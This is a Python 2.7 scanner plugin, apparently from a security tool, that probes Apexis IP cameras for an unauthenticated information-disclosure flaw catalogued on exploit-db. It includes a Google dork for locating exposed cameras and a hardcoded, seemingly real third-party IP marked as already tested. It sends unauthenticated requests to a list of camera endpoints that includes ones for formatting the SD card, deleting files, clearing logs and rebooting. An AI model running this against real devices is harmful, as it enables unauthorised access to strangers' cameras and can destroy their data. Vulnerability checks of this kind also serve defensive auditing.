#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'Apexis IP CAM Full Info Disclosure',
	'AUTHOR':'yangbh',
	'TIME':'20150626',
	'WEB':'https://www.exploit-db.com/exploits/37298/',
	'DESCRIPTION':'Google Dork: inurl:"get_status.cgi"cgi-bin/'
}
opts = {
	'url':'http://195.221.154.86:8084/',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'apexis':
			return True
	return False

def Audit(services):
	paths = ('backup_params.cgi','check_user.cgi','clear_log.cgi','control_cruise.cgi','decoder_control.cgi','delete_sdcard_file.cgi','download_sdcard_file.cgi','format_sdc.cgi','get_alarm_schedule.cgi','get_camera_vars.cgi','get_cruise.cgi','get_extra_server.cgi','get_list_cruise.cgi','get_log_info.cgi','get_log_page.cgi','get_maintain.cgi','get_motion_schedule.cgi','get_params.cgi','get_preset_status.cgi','get_real_status.cgi','get_sdc_status.cgi','get_status.cgi','get_sycc_account.cgi','get_tutk_account.cgi','get_wifi_scan_result.cgi','mobile_snapshot.cgi','reboot.cgi')
	urls = [services['url'] + 'cgi-bin/' + path for path in paths]
	try:
		for url in urls:
			rq = requests.get(url,timeout=10)
			if rq.status_code == 200 and 'var' in rq.text:
				security_hole(url)
				break
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	already test
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	url='http://195.221.154.86:8084/'
	if len(sys.argv) ==  2:
		url = sys.argv[1]
	services={'url':url,'cms':'apexis','webserverversion':'5.5'}
	pprint(Audit(services))
	pprint(services)
